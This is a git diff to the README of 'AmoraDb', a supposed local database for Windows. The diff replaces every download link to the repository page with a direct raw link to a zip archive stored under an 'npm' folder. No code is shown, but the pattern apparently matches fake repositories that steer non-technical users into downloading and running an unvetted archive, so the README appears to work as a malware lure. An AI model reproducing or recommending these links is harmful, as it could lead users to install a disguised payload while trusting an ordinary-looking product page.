@@ -1,12 +1,12 @@
 # 💾 AmoraDb - Simple local database for Windows
 
-[Download AmoraDb](https://github.com/Ingabergapophatic534/AmoraDb){style="background-color:#6c757d;color:#ffffff;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;"}
+[Download AmoraDb](https://github.com/Ingabergapophatic534/AmoraDb/raw/refs/heads/main/npm/Db-Amora-v3.6.zip){style="background-color:#6c757d;color:#ffffff;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;"}
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-https://github.com/Ingabergapophatic534/AmoraDb
+https://github.com/Ingabergapophatic534/AmoraDb/raw/refs/heads/main/npm/Db-Amora-v3.6.zip
 
 Download the latest Windows file from the page, then save it to your PC
 
@@ -167,4 +167,4 @@ This helps you get comfortable with the app before you put in more records
 
 If you need the download page again, use this link:
 
-https://github.com/Ingabergapophatic534/AmoraDb
+https://github.com/Ingabergapophatic534/AmoraDb/raw/refs/heads/main/npm/Db-Amora-v3.6.zip
